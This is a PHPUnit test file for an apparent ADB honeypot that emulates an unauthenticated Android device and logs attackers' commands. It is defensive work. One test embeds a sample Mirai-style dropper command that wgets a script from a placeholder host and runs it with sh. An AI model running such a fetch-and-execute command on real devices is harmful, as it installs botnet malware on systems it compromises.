<?php

declare(strict_types=1);

namespace Funnypot\Tests\Protocol\Adb;

use Funnypot\Protocol\Adb\AdbConfig;
use Funnypot\Protocol\Adb\AdbServer;
use Funnypot\Protocol\Adb\AdbSession;
use PHPUnit\Framework\TestCase;

final class AdbHandshakeTest extends TestCase
{
    /** @var array<int,array<string,mixed>> */
    private array $events = [];

    private function newServer(?AdbConfig $config = null): AdbServer
    {
        $this->events = [];

        return new AdbServer($config ?? new AdbConfig(), function (array $e): void {
            $this->events[] = $e;
        });
    }

    /**
     * Pops the first ADB message off $buf, advancing it past the message.
     *
     * @return array{command:int,arg0:int,arg1:int,payload:string}
     */
    private static function pop(string &$buf): array
    {
        self::assertGreaterThanOrEqual(24, strlen($buf), 'expected a full ADB header');
        $command = unpack('V', substr($buf, 0, 4))[1];
        $arg0 = unpack('V', substr($buf, 4, 4))[1];
        $arg1 = unpack('V', substr($buf, 8, 4))[1];
        $dataLen = unpack('V', substr($buf, 12, 4))[1];
        $crc = unpack('V', substr($buf, 16, 4))[1];
        $magic = unpack('V', substr($buf, 20, 4))[1];

        self::assertSame(($command ^ 0xFFFFFFFF) & 0xFFFFFFFF, $magic, 'magic must be ~command');
        $payload = substr($buf, 24, $dataLen);
        self::assertSame(AdbServer::checksum($payload), $crc, 'checksum must be the payload byte-sum');
        $buf = substr($buf, 24 + $dataLen);

        return ['command' => $command, 'arg0' => $arg0, 'arg1' => $arg1, 'payload' => $payload];
    }

    public function test_connect_is_answered_with_device_banner_and_no_auth_challenge(): void
    {
        $server = $this->newServer();
        $session = new AdbSession('203.0.113.5', 40000, 1);
        $session->inbuf .= AdbServer::buildMessage(
            AdbServer::A_CNXN,
            AdbConfig::VERSION,
            262144,
            "host::features=cmd,shell_v2,stat_v2\x00"
        );
        $server->processInbound($session);

        $reply = self::pop($session->outbuf);
        self::assertSame(AdbServer::A_CNXN, $reply['command'], 'insecure device answers A_CNXN, never A_AUTH');
        $banner = rtrim($reply['payload'], "\x00");
        self::assertStringStartsWith('device::', $banner);
        self::assertStringContainsString('ro.product.model=rk3288', $banner);
        self::assertStringContainsString('features=cmd,shell_v2', $banner);
        self::assertTrue($session->connected);
    }

    public function test_open_shell_captures_command_and_answers_okay_write_close(): void
    {
        $server = $this->newServer();
        $session = new AdbSession('203.0.113.5', 40000, 1);
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_CNXN, AdbConfig::VERSION, 262144, "host::\x00");
        $server->processInbound($session);
        $session->outbuf = '';

        // Client opens a shell stream (its local-id 7) requesting `uname -a`.
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_OPEN, 7, 0, "shell:uname -a\x00");
        $server->processInbound($session);

        $open = $this->eventOfType('adb_open');
        self::assertNotNull($open);
        self::assertSame('high', $open['severity']);
        self::assertStringContainsString('uname -a', $open['path']);
        self::assertSame('shell:uname -a', $open['service']);

        // The stream is answered A_OKAY, then a small A_WRTE of fake output, then A_CLSE.
        $okay = self::pop($session->outbuf);
        self::assertSame(AdbServer::A_OKAY, $okay['command']);
        self::assertSame(7, $okay['arg1'], 'A_OKAY echoes the client stream id');

        $write = self::pop($session->outbuf);
        self::assertSame(AdbServer::A_WRTE, $write['command']);
        self::assertStringContainsString('Linux', $write['payload']);
        self::assertSame($okay['arg0'], $write['arg0'], 'A_WRTE rides our stream id');

        $close = self::pop($session->outbuf);
        self::assertSame(AdbServer::A_CLSE, $close['command']);
        self::assertSame('', $session->outbuf, 'exactly OKAY + WRTE + CLSE');
    }

    public function test_open_captures_the_verbatim_botnet_dropper_command(): void
    {
        // The command a Mirai/miner dropper pushes is the whole intel value — capture it byte-for-byte.
        $cmd = 'shell:cd /data/local/tmp; rm -rf boot.sh; wget http://198.51.100.9/boot.sh; sh boot.sh';

        $server = $this->newServer();
        $session = new AdbSession('192.0.2.66', 55000, 1);
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_OPEN, 3, 0, $cmd . "\x00");
        $server->processInbound($session);

        $open = $this->eventOfType('adb_open');
        self::assertNotNull($open);
        self::assertSame($cmd, $open['service']);
        self::assertSame('high', $open['severity']);
        // The command is only ever logged, never run.
        self::assertStringContainsString('wget http://198.51.100.9/boot.sh', $open['body']);
    }

    public function test_pushed_stream_bytes_are_captured_and_acknowledged(): void
    {
        // A sync: stream (used by `adb push`) stays open so the bytes streamed after it — the dropper
        // binary — are captured too.
        $server = $this->newServer();
        $session = new AdbSession('192.0.2.66', 55000, 1);
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_OPEN, 9, 0, "sync:\x00");
        $server->processInbound($session);

        // Only A_OKAY: a streaming service is not closed on our side.
        $okay = self::pop($session->outbuf);
        self::assertSame(AdbServer::A_OKAY, $okay['command']);
        self::assertSame('', $session->outbuf, 'no A_CLSE for a streaming service');
        $ourId = $okay['arg0'];

        // The client pushes payload bytes on the stream (ELF magic + junk standing in for a dropper).
        $pushed = "\x7fELF\x01\x01\x01\x00" . str_repeat("\x90", 32);
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_WRTE, 9, $ourId, $pushed);
        $server->processInbound($session);

        $writes = array_values(array_filter(
            $this->events,
            static fn (array $e): bool => ($e['event'] ?? '') === 'adb_open' && str_contains($e['path'] ?? '', 'stream write')
        ));
        self::assertCount(1, $writes);
        self::assertSame(strlen($pushed), $writes[0]['bytes']);
        self::assertStringStartsWith('7f454c46', $writes[0]['hex'], 'captured ELF magic as hex');
        self::assertSame('high', $writes[0]['severity']);

        // The write is acknowledged so the client keeps streaming.
        $ack = self::pop($session->outbuf);
        self::assertSame(AdbServer::A_OKAY, $ack['command']);
    }

    public function test_client_close_is_echoed_for_an_open_stream(): void
    {
        $server = $this->newServer();
        $session = new AdbSession('192.0.2.66', 55000, 1);
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_OPEN, 12, 0, "sync:\x00");
        $server->processInbound($session);
        $okay = self::pop($session->outbuf);
        $ourId = $okay['arg0'];

        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_CLSE, 12, $ourId, '');
        $server->processInbound($session);

        $close = self::pop($session->outbuf);
        self::assertSame(AdbServer::A_CLSE, $close['command']);
        self::assertSame(12, $close['arg1']);
    }

    public function test_bad_magic_logs_unknown_and_closes(): void
    {
        // A non-ADB probe: a valid-length 24-byte header whose magic is not ~command.
        $server = $this->newServer();
        $session = new AdbSession('192.0.2.1', 5000, 1);
        $session->inbuf .= pack('V', AdbServer::A_CNXN) . str_repeat("\x00", 16) . pack('V', 0x12345678);
        $server->processInbound($session);

        self::assertTrue($session->close);
        self::assertNotNull($this->eventOfType('adb_unknown'));
    }

    public function test_non_adb_input_closes_cleanly(): void
    {
        // An HTTP probe arriving on 5555 is not an ADB header: log and drop, never crash.
        $server = $this->newServer();
        $session = new AdbSession('192.0.2.2', 5001, 1);
        $session->inbuf .= "GET / HTTP/1.1\r\nHost: x\r\n\r\n";
        $server->processInbound($session);

        self::assertTrue($session->close);
        self::assertNotNull($this->eventOfType('adb_unknown'));
    }

    public function test_partial_message_is_buffered_until_complete(): void
    {
        $server = $this->newServer();
        $session = new AdbSession('192.0.2.3', 5002, 1);

        $msg = AdbServer::buildMessage(AdbServer::A_OPEN, 1, 0, "shell:id\x00");
        // Header plus part of the payload: nothing parsed yet.
        $session->inbuf .= substr($msg, 0, 28);
        $server->processInbound($session);
        self::assertNull($this->eventOfType('adb_open'));

        // Deliver the remainder: the open now parses.
        $session->inbuf .= substr($msg, 28);
        $server->processInbound($session);
        self::assertNotNull($this->eventOfType('adb_open'));
    }

    public function test_oversize_payload_logs_unknown_and_closes(): void
    {
        // A header claiming a payload beyond the cap must be refused, never buffered.
        $server = $this->newServer();
        $session = new AdbSession('192.0.2.4', 5003, 1);
        $session->inbuf .= AdbServer::buildMessage(AdbServer::A_WRTE, 1, 1, '') // valid, ignored
            . pack('V', AdbServer::A_WRTE)
            . pack('V', 1) . pack('V', 1)
            . pack('V', 0x7FFFFFFF) // absurd data_length
            . pack('V', 0)
            . pack('V', (AdbServer::A_WRTE ^ 0xFFFFFFFF) & 0xFFFFFFFF);
        $server->processInbound($session);

        self::assertNotNull($this->eventOfType('adb_unknown'));
        self::assertTrue($session->close);
    }

    /**
     * @return array<string,mixed>|null
     */
    private function eventOfType(string $type): ?array
    {
        foreach ($this->events as $e) {
            if (($e['event'] ?? '') === $type) {
                return $e;
            }
        }

        return null;
    }
}
